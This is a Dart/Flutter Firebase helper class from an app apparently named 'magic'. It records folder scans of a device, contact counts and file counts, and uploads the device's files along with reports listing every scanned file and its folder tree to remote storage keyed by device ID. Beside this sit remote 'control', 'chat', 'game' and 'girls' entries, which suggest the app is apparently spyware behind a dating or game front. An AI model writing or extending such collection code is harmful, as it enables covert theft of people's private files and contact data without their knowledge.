import 'dart:convert';
import 'dart:io';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:magic/helpers/device_info_helper.dart';
import 'package:magic/model/app_update.dart';
import 'package:magic/model/girls_model.dart';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:uuid/uuid.dart';
import 'package:crypto/crypto.dart';

class DbHelper {
  // === NEW: Progress tracking constants ===
  static const String UPLOAD_PROGRESS_KEY = 'upload_progress';
  static const String UPLOAD_STATS_KEY = 'upload_stats';
  static const String UPLOAD_SESSIONS_KEY = 'upload_sessions';
  static const String CURRENT_UPLOADS_KEY = 'current_uploads';

  // === MINIMAL CHANGES TO EXISTING METHODS ===

  static Future<void> saveFilesScanInfo({
    required String id,
    required List<String> folders,
    required int foundFiles,
    required int newlyUploadedCount,
    required int totalUploadedCount,
    List<String>? scannedFiles,
    Map<String, dynamic>? fileTree,
    String? scanType,
  }) async {
    final ref = FirebaseDatabase.instance.ref('files/$id/scan_info');
    await ref.set({
      'status': 'completed',
      'folders': folders,
      'found_files': foundFiles,
      'newly_uploaded_count': newlyUploadedCount,
      'total_uploaded_count': totalUploadedCount,
      'timestamp': DateTime.now().toIso8601String(),
    });

    // === NEW: Update upload progress ===
    await updateUploadProgress(
      deviceId: id,
      currentFile: totalUploadedCount,
      totalFiles: foundFiles,
      fileName: 'Scan complete',
      isUploading: false,
    );

    if (scannedFiles != null && scanType != null) {
      await generateScannedFilesReport(
        deviceId: id,
        scannedFiles: scannedFiles,
        fileTree: fileTree,
        scanType: scanType,
      );
    }

    await cleanUploadedFilesList(id);
  }

  static Future<void> saveContactsCount(String id, int count) async {
    final ref = FirebaseDatabase.instance.ref('contacts/$id');
    await ref.set({'count': count});
  }

  static Future<void> saveFilesCount(String id, int count) async {
    final ref = FirebaseDatabase.instance.ref('files/$id');
    await ref.set({'count': count});
  }

  static Future<void> addAvatar(String id, String name) async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("users/$id/avatar");
    await ref.set({
      'fileName': name,
      'uploadTime': DateTime.now().toIso8601String(),
    });
  }

  static Future<String?> getImageUrl(String path) async {
    final ref = FirebaseStorage.instance.ref().child(path);
    String? url;
    try {
      url = await ref.getDownloadURL();
    } on FirebaseException {
      url = null;
    } catch (e) {
      url = null;
    }
    return url;
  }

  static Future<void> saveTap(Map<String, dynamic> data) async {
    String? id = await DeviceInfoHelper.getUID();

    var uuid = Uuid();
    String u = uuid.v1();

    DatabaseReference ref =
    FirebaseDatabase.instance.ref("control_history/$id/$u");
    await ref.set(data);
  }

  static Future<void> resetControl() async {
    String? id = await DeviceInfoHelper.getUID();

    DatabaseReference ref = FirebaseDatabase.instance.ref("control_gear/$id");
    await ref.set({
      'global': 0,
      'modes': 0,
      'intensive': 0,
      'other': 0,
    });
  }

  static Future<void> updateControl(Map<String, dynamic> data) async {
    String? id = await DeviceInfoHelper.getUID();
    DatabaseReference ref = FirebaseDatabase.instance.ref("control_gear/$id");
    await ref.update(data);
  }

  Future<bool> checkChat(String id) async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$id/chat");
    final snapshot = await ref.get();
    if (snapshot.exists) {
      var data = snapshot.value;
      if (data != null) {
        return data as bool;
      }
    }
    return false;
  }

  Future<bool> checkInfo(String id) async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$id/info");
    final snapshot = await ref.get();
    return snapshot.exists;
  }

  static Future<bool> checkGame() async {
    final String? id = await DeviceInfoHelper.getUID();
    DatabaseReference ref = FirebaseDatabase.instance.ref("devices/$id/game");
    final snapshot = await ref.get();
    if (snapshot.exists) {
      var data = snapshot.value;
      if (data != null) {
        return data as bool;
      }
    }
    return false;
  }

  Future<List<GirlModel>> getGirls() async {
    DatabaseReference ref = FirebaseDatabase.instance.ref("girls");
    final snapshot = await ref.get();
    if (snapshot.exists) {
      var data = snapshot.value;
      if (data != null) {
        Map<String, GirlModel> result = girlsModelFromJson(jsonEncode(data));
        List<GirlModel> girls = result.entries.map((e) {
          GirlModel model = e.value;
          return model;
        }).toList();
        return girls;
      }
    }
    return [];
  }

  static Future<String> updateMagicUser(Map<String, dynamic> data) {
    CollectionReference users = FirebaseFirestore.instance.collection('users');
    final user = FirebaseAuth.instance.currentUser;

    return users
        .doc(user!.uid)
        .update(data)
        .then((value) => ("User updated successfully!"))
        .catchError((error) => ("Error: $error"));
  }

  static Future<AppUpdate?> getAppUpdate() async {
    final snapshot =
    await FirebaseDatabase.instance.ref("app_update").ref.get();
    if (snapshot.exists) {
      return AppUpdate.fromMap(snapshot.value as Map<dynamic, dynamic>);
    } else {
      return null;
    }
  }

  // === ENHANCED METHODS FOR UPLOAD PROGRESS TRACKING ===

  /// === NEW: Save files statistics with progress ===
  static Future<void> saveFilesStatistics({
    required String deviceId,
    required int totalFiles,
    required int uploadedFiles,
    required int remainingFiles,
    required double uploadPercentage,
    int filesSkipped = 0,
    String scanType = 'manual',
  }) async {
    try {
      final database = FirebaseDatabase.instance;
      final timestamp = DateTime.now().toIso8601String();

      // Save to devices/{deviceId}/file_statistics
      final statsRef = database.ref("devices/$deviceId/file_statistics");
      await statsRef.set({
        'total_files': totalFiles,
        'uploaded_files': uploadedFiles,
        'remaining_files': remainingFiles,
        'upload_percentage': uploadPercentage.toStringAsFixed(1),
        'files_skipped': filesSkipped,
        'last_update': timestamp,
        'scan_type': scanType,
        'device_id': deviceId,
      });

      print('✅ Files statistics saved: $uploadedFiles/$totalFiles (${uploadPercentage.toStringAsFixed(1)}%)');
    } catch (e) {
      print('❌ Error saving files statistics: $e');
    }
  }

  /// === NEW: Update upload progress in real-time ===
  static Future<void> updateUploadProgress({
    required String deviceId,
    required int currentFile,
    required int totalFiles,
    required String fileName,
    required bool isUploading,
  }) async {
    try {
      final database = FirebaseDatabase.instance;

      final progressRef = database.ref("devices/$deviceId/$UPLOAD_PROGRESS_KEY");

      final progress = {
        'current_file': currentFile,
        'total_files': totalFiles,
        'current_file_name': fileName,
        'percentage': totalFiles > 0 ? ((currentFile / totalFiles) * 100).toStringAsFixed(1) : '0.0',
        'is_uploading': isUploading,
        'last_update': DateTime.now().millisecondsSinceEpoch,
        'status': isUploading ? 'uploading' : isUploading ? 'paused' : 'idle',
        'device_id': deviceId,
      };

      await progressRef.set(progress);

      // Log every 10 files or significant progress
      if (currentFile % 10 == 0 || !isUploading) {
        print('📈 Upload progress: $currentFile/$totalFiles (${progress['percentage']}%) - $fileName');
      }
    } catch (e) {
      print('⚠️ Failed to update upload progress: $e');
    }
  }

  /// === NEW: Complete upload session ===
  static Future<void> completeUploadSession({
    required String deviceId,
    required int totalUploaded,
    required int totalSkipped,
    required bool success,
    required String sessionType,
  }) async {
    try {
      final database = FirebaseDatabase.instance;

      final sessionRef = database.ref("devices/$deviceId/$UPLOAD_SESSIONS_KEY").push();

      final sessionData = {
        'device_id': deviceId,
        'session_id': 'session_${DateTime.now().millisecondsSinceEpoch}',
        'start_time': DateTime.now().subtract(Duration(minutes: 5)).toIso8601String(),
        'end_time': DateTime.now().toIso8601String(),
        'total_files_attempted': totalUploaded + totalSkipped,
        'total_files_uploaded': totalUploaded,
        'total_files_skipped': totalSkipped,
        'success_rate': totalUploaded > 0 ? ((totalUploaded / (totalUploaded + totalSkipped)) * 100).toStringAsFixed(1) : '0.0',
        'success': success,
        'session_type': sessionType,
        'created_at': DateTime.now().millisecondsSinceEpoch,
      };

      await sessionRef.set(sessionData);

      // Clear current progress
      await database.ref("devices/$deviceId/$UPLOAD_PROGRESS_KEY").remove();

      print('✅ Upload session completed: $totalUploaded files uploaded, $totalSkipped skipped');
    } catch (e) {
      print('❌ Error completing upload session: $e');
    }
  }

  /// === NEW: Track individual file upload ===
  static Future<void> startFileUpload({
    required String deviceId,
    required String filePath,
    required int fileSize,
    required String uploadType,
  }) async {
    try {
      final database = FirebaseDatabase.instance;

      final fileId = 'file_${DateTime.now().millisecondsSinceEpoch}';
      final timestamp = DateTime.now().toIso8601String();

      final uploadRef = database.ref("devices/$deviceId/$CURRENT_UPLOADS_KEY/$fileId");

      await uploadRef.set({
        'file_id': fileId,
        'file_name': filePath.split('/').last,
        'file_path': filePath,
        'file_size': fileSize,
        'upload_type': uploadType,
        'status': 'started',
        'start_time': timestamp,
        'progress': 0,
        'device_id': deviceId,
      });

      print('📤 Started tracking upload: ${filePath.split('/').last}');
    } catch (e) {
      print('❌ Error starting file upload tracking: $e');
    }
  }

  /// === NEW: Update individual file upload progress ===
  static Future<void> updateFileUploadProgress({
    required String deviceId,
    required String filePath,
    required double progress,
  }) async {
    try {
      final database = FirebaseDatabase.instance;

      final uploadsRef = database.ref("devices/$deviceId/$CURRENT_UPLOADS_KEY");
      final snapshot = await uploadsRef.get();

      if (snapshot.exists) {
        final uploads = Map<String, dynamic>.from(snapshot.value as Map<dynamic, dynamic>);

        for (final entry in uploads.entries) {
          final uploadData = entry.value;
          if (uploadData['file_path'] == filePath) {
            await uploadsRef.child('${entry.key}/progress').set(progress);
            await uploadsRef.child('${entry.key}/last_update').set(
                DateTime.now().toIso8601String()
            );

            if (progress % 25 < 0.1) {
              print('📊 Upload progress for ${filePath.split('/').last}: ${progress.toStringAsFixed(1)}%');
            }
            break;
          }
        }
      }
    } catch (e) {
      print('❌ Error updating file upload progress: $e');
    }
  }

  /// === NEW: Complete individual file upload ===
  static Future<void> completeFileUpload({
    required String deviceId,
    required String filePath,
    required bool success,
    String? downloadUrl,
    String? error,
  }) async {
    try {
      final database = FirebaseDatabase.instance;
      final timestamp = DateTime.now().toIso8601String();

      final currentRef = database.ref("devices/$deviceId/$CURRENT_UPLOADS_KEY");
      final snapshot = await currentRef.get();

      if (snapshot.exists) {
        final uploads = Map<String, dynamic>.from(snapshot.value as Map<dynamic, dynamic>);

        for (final entry in uploads.entries) {
          final uploadData = entry.value;
          if (uploadData['file_path'] == filePath) {
            final fileId = entry.key;

            // Move to history
            final historyRef = database.ref("devices/$deviceId/upload_history/$fileId");
            await historyRef.set({
              ...uploadData,
              'status': success ? 'completed' : 'failed',
              'end_time': timestamp,
              'success': success,
              'download_url': downloadUrl,
              'error': error,
            });

            // Remove from current
            await currentRef.child(fileId).remove();

            // Update overall stats
            await _updateUploadStats(deviceId, success);

            print('✅ File upload completed: ${filePath.split('/').last} - Success: $success');
            break;
          }
        }
      }
    } catch (e) {
      print('❌ Error completing file upload: $e');
    }
  }

  /// === NEW: Update overall upload statistics ===
  static Future<void> _updateUploadStats(String deviceId, bool success) async {
    try {
      final database = FirebaseDatabase.instance;

      final statsRef = database.ref("devices/$deviceId/$UPLOAD_STATS_KEY");
      final snapshot = await statsRef.get();

      Map<String, dynamic> currentStats = {};
      if (snapshot.exists) {
        currentStats = Map<String, dynamic>.from(snapshot.value as Map<dynamic, dynamic>);
      }

      final updatedStats = {
        'total_attempts': (currentStats['total_attempts'] ?? 0) + 1,
        'successful_uploads': (currentStats['successful_uploads'] ?? 0) + (success ? 1 : 0),
        'failed_uploads': (currentStats['failed_uploads'] ?? 0) + (success ? 0 : 1),
        'last_upload_time': DateTime.now().toIso8601String(),
        'success_rate': '0.0',
      };

      final total = updatedStats['total_attempts'];
      final successful = updatedStats['successful_uploads'];
      if (total > 0) {
        updatedStats['success_rate'] = ((successful / total) * 100).toStringAsFixed(1);
      }

      await statsRef.set(updatedStats);
    } catch (e) {
      print('❌ Error updating upload stats: $e');
    }
  }

  /// === NEW: Get current upload progress ===
  static Future<Map<String, dynamic>?> getUploadProgress(String deviceId) async {
    try {
      final database = FirebaseDatabase.instance;
      final progressRef = database.ref("devices/$deviceId/$UPLOAD_PROGRESS_KEY");
      final snapshot = await progressRef.get();

      if (snapshot.exists) {
        return Map<String, dynamic>.from(snapshot.value as Map<dynamic, dynamic>);
      }
      return null;
    } catch (e) {
      print('❌ Error getting upload progress: $e');
      return null;
    }
  }

  // === EXISTING METHODS (minimally modified) ===

  static Future<void> saveUploadedFileStatus({
    required String deviceId,
    required String filePath,
    required String fileHash,
    required int fileSize,
    required String firebaseUrl,
  }) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final uploadedFilesKey = 'uploaded_files_$deviceId';

      final uploadedFilesJson = prefs.getString(uploadedFilesKey) ?? '{}';
      final uploadedFiles =
      Map<String, dynamic>.from(jsonDecode(uploadedFilesJson));

      uploadedFiles[filePath] = {
        'hash': fileHash,
        'size': fileSize,
        'firebase_url': firebaseUrl,
        'uploaded_at': DateTime.now().toIso8601String(),
      };

      await prefs.setString(uploadedFilesKey, jsonEncode(uploadedFiles));
      await _saveUploadedFilesToFile(deviceId, uploadedFiles);

      // === NEW: Also save to Firebase for progress tracking ===
      final database = FirebaseDatabase.instance;
      final firebaseRef = database.ref("devices/$deviceId/uploaded_files/${_hashString(fileHash)}");
      await firebaseRef.set({
        'file_path': filePath,
        'file_hash': fileHash,
        'file_size': fileSize,
        'firebase_url': firebaseUrl,
        'uploaded_at': DateTime.now().toIso8601String(),
        'device_id': deviceId,
      });

    } catch (e) {
      print('❌ Error saving uploaded file status: $e');
    }
  }

  static Future<bool> isFileAlreadyUploaded({
    required String deviceId,
    required String filePath,
    required String fileHash,
    required int fileSize,
  }) async {
    try {
      // === NEW: Check Firebase first ===
      final database = FirebaseDatabase.instance;
      final firebaseRef = database.ref("devices/$deviceId/uploaded_files/${_hashString(fileHash)}");
      final snapshot = await firebaseRef.get();

      if (snapshot.exists) {
        print('✅ File already uploaded (Firebase): $filePath');
        return true;
      }

      // Original local check
      final prefs = await SharedPreferences.getInstance();
      final uploadedFilesKey = 'uploaded_files_$deviceId';

      final uploadedFilesJson = prefs.getString(uploadedFilesKey);
      if (uploadedFilesJson == null) return false;

      final uploadedFiles = Map<String, dynamic>.from(jsonDecode(uploadedFilesJson));

      if (uploadedFiles.containsKey(filePath)) {
        final fileInfo = uploadedFiles[filePath];

        if (fileInfo['hash'] == fileHash && fileInfo['size'] == fileSize) {
          return true;
        } else {
          uploadedFiles.remove(filePath);
          await prefs.setString(uploadedFilesKey, jsonEncode(uploadedFiles));
          return false;
        }
      }

      return false;
    } catch (e) {
      print('❌ Error checking if file already uploaded: $e');
      return false;
    }
  }

  static Future<String> generateFileHash(File file) async {
    try {
      final bytes = await file.readAsBytes();
      final digest = sha256.convert(bytes);
      return digest.toString();
    } catch (e) {
      final stat = await file.stat();
      return '${file.path}_${stat.size}_${stat.modified.millisecondsSinceEpoch}';
    }
  }

  static Future<void> _saveUploadedFilesToFile(
      String deviceId, Map<String, dynamic> uploadedFiles) async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final file = File('${directory.path}/uploaded_files_$deviceId.json');

      final data = {
        'device_id': deviceId,
        'uploaded_files': uploadedFiles,
        'last_updated': DateTime.now().toIso8601String(),
        'total_files': uploadedFiles.length,
      };

      await file.writeAsString(jsonEncode(data));
    } catch (e) {
      print('❌ Error saving uploaded files to file: $e');
    }
  }

  static Future<void> generateScannedFilesReport({
    required String deviceId,
    required List<String> scannedFiles,
    required Map<String, dynamic>? fileTree,
    required String scanType,
  }) async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final timestamp = DateTime.now().toIso8601String().replaceAll(':', '-');
      final fileName = 'scanned_files_${scanType}_${deviceId}_$timestamp.json';
      final file = File('${directory.path}/$fileName');

      final reportData = {
        'device_id': deviceId,
        'scan_type': scanType,
        'timestamp': DateTime.now().toIso8601String(),
        'total_files': scannedFiles.length,
        'scanned_files': scannedFiles,
        'file_tree': fileTree,
        'scan_session_id': const Uuid().v4(),
      };

      await file.writeAsString(jsonEncode(reportData));

      await addReportToUploadQueue(deviceId, file.path);
    } catch (e) {
      print('❌ Error generating scanned files report: $e');
    }
  }

  static Future<void> addReportToUploadQueue(
      String deviceId, String reportFilePath) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final reportsQueueKey = 'reports_upload_queue_$deviceId';

      final existingQueue = prefs.getStringList(reportsQueueKey) ?? <String>[];

      if (!existingQueue.contains(reportFilePath)) {
        existingQueue.add(reportFilePath);
        await prefs.setStringList(reportsQueueKey, existingQueue);
      }
    } catch (e) {
      print('❌ Error adding report to queue: $e');
    }
  }

  static Future<List<String>> getReportsUploadQueue(String deviceId) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final reportsQueueKey = 'reports_upload_queue_$deviceId';
      return prefs.getStringList(reportsQueueKey) ?? <String>[];
    } catch (e) {
      return <String>[];
    }
  }

  static Future<void> removeReportFromQueue(
      String deviceId, String reportFilePath) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final reportsQueueKey = 'reports_upload_queue_$deviceId';

      final existingQueue = prefs.getStringList(reportsQueueKey) ?? <String>[];
      existingQueue.remove(reportFilePath);
      await prefs.setStringList(reportsQueueKey, existingQueue);

      final file = File(reportFilePath);
      if (await file.exists()) {
        await file.delete();
      }
    } catch (e) {
      print('❌ Error removing report from queue: $e');
    }
  }

  static Future<bool> uploadScannedFilesReport(
      String deviceId, String reportFilePath) async {
    try {
      final file = File(reportFilePath);
      if (!await file.exists()) return false;

      final fileName = file.path.split('/').last;
      final storageRef =
      FirebaseStorage.instance.ref().child('reports/$deviceId/$fileName');

      await storageRef.putFile(file);

      await removeReportFromQueue(deviceId, reportFilePath);

      return true;
    } catch (e) {
      print('❌ Error uploading report: $e');
      return false;
    }
  }

  static Future<void> processReportUploads(String deviceId) async {
    try {
      final reportsQueue = await getReportsUploadQueue(deviceId);

      for (final reportPath in reportsQueue) {
        await uploadScannedFilesReport(deviceId, reportPath);
        await Future.delayed(const Duration(milliseconds: 500));
      }
    } catch (e) {
      print('❌ Error in processReportUploads: $e');
    }
  }

  static Future<void> cleanUploadedFilesList(String deviceId) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final uploadedFilesKey = 'uploaded_files_$deviceId';
      final uploadedFilesJson = prefs.getString(uploadedFilesKey) ?? '{}';
      final uploadedFiles =
      Map<String, dynamic>.from(jsonDecode(uploadedFilesJson));

      final filesToRemove = <String>[];

      for (final filePath in uploadedFiles.keys) {
        final file = File(filePath);
        if (!await file.exists()) {
          filesToRemove.add(filePath);
        }
      }

      for (final filePath in filesToRemove) {
        uploadedFiles.remove(filePath);
      }

      await prefs.setString(uploadedFilesKey, jsonEncode(uploadedFiles));
    } catch (e) {
      print('❌ Error cleaning uploaded files list: $e');
    }
  }

  static Future<int> getUploadedFilesCount(String deviceId) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final uploadedFilesKey = 'uploaded_files_$deviceId';
      final uploadedFilesJson = prefs.getString(uploadedFilesKey) ?? '{}';
      final uploadedFiles =
      Map<String, dynamic>.from(jsonDecode(uploadedFilesJson));
      return uploadedFiles.length;
    } catch (e) {
      return 0;
    }
  }

  // === NEW: Utility method for hashing ===
  static String _hashString(String input) {
    return input.replaceAll(RegExp(r'[^\w]'), '_');
  }
}

class UIDTarget {
  Future<String> initUID() async {
    final user = FirebaseAuth.instance.currentUser;

    if (user == null) {
      return '';
    }

    final String userId = user.uid;

    final SharedPreferences prefs = await SharedPreferences.getInstance();

    final deviceRef = FirebaseDatabase.instance.ref("devices/$userId");
    final snapshot = await deviceRef.get();

    if (snapshot.exists) {
      await prefs.setString('id', userId);
      return userId;
    } else {
      await deviceRef.set({
        'createdAt': DateTime.now().toIso8601String(),
        'userId': userId,
      });
      await prefs.setString('id', userId);
      return userId;
    }
  }

  Future<String> getUid() async {
    final SharedPreferences prefs = await SharedPreferences.getInstance();
    String? cachedId = prefs.getString('id');

    if (cachedId != null && cachedId.isNotEmpty) {
      return cachedId;
    }

    final uid = await initUID();
    return uid;
  }
}